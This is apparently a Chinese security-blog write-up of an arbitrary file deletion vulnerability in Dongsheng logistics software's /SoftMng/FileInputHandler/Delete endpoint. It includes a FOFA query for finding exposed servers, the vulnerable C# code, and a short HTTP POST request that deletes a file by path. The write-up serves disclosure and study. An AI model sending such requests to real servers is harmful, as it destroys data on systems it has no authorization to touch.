---
title: "东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞"
source: https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Delete.html
asset_dir: assets/东胜物流软件-softmngfileinputhandlerdelete-文件删除漏洞
---

# 东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/8 08:31
* 230浏览
* [0评论](#comment)
* 15分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

东胜物流软件是由青岛东胜伟业软件有限公司开发的一款综合性物流管理系统，广泛应用于物流行业，提供订单管理、仓库管理、运输管理等多种功能，旨在提升物流业务效率。该软件的 `/SoftMng/FileInputHandler/Delete` 接口存在文件删除[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。此接口是 `FileInputHandler` 模块的一部分，通常负责处理文件相关的操作。攻击者可能利用此漏洞，[未经授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)地调用该接口，并指定服务器上的任意文件路径进行删除。

物流软件安全

# 影响版本

# fofa语法

> (body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"

# 漏洞分析

路由相关参考上一篇[东胜物流软件 /SoftMng/FileInputHandler/Upload 文件上传漏洞](https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Upload-RCE.html)部分，在同一个Controller下找到**Delete**方法

```
public JsonResult Delete(List<FileClass> filepath)
{
  try
  {
    string str1 = this.Request[nameof (filepath)];
    if (!string.IsNullOrEmpty(str1))
      filepath = new JavaScriptSerializer().Deserialize<List<FileClass>>(str1);
    foreach (FileClass fileClass in filepath)
    {
      string str2 = this.Server.MapPath(fileClass.url);
      if (System.IO.File.Exists(str2))
        System.IO.File.Delete(str2);
    }
    return this.Json((object) new
    {
      success = true,
      msg = "删除成功"
    });
  }
  catch (Exception ex)
  {
    return this.Json((object) new
    {
      success = false,
      msg = ex.Message
    });
  }
}
```

* `fileClass.url` 完全受用户控制
* `Server.MapPath` 将相对路径转换为物理路径,但未做任何白名单限制
* 未验证文件所属目录是否在允许删除的范围内
* 没有权限检查,任何经过身份验证的用户都可以删除任意文件

# 漏洞复现

先上传一个png文件作为测试文件

漏洞扫描服务

[![东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞](images/img-001-2d5d7942cce7.webp)](https://image.mrxn.net/93d900c23227430baf649ac94bb86005.webp)

删除上传回显的文件路径

```
POST /SoftMng/FileInputHandler/Delete HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/x-www-form-urlencoded

filepath=[{"url":"/UploadFiles/Filepuload/202xxx/xxxxx.png"}]
```

再次访问 404 ，证明删除成功

编程

[![东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞](images/img-002-ec48849f132e.webp)](https://image.mrxn.net/640c128bc929414e8012bc78ee123352.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[东胜物流软件 /SoftMng/FileInputHandler/Delete 文件删除漏洞](https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Delete.html)  
文章链接：<https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Delete.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

计算机服务器

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Delete.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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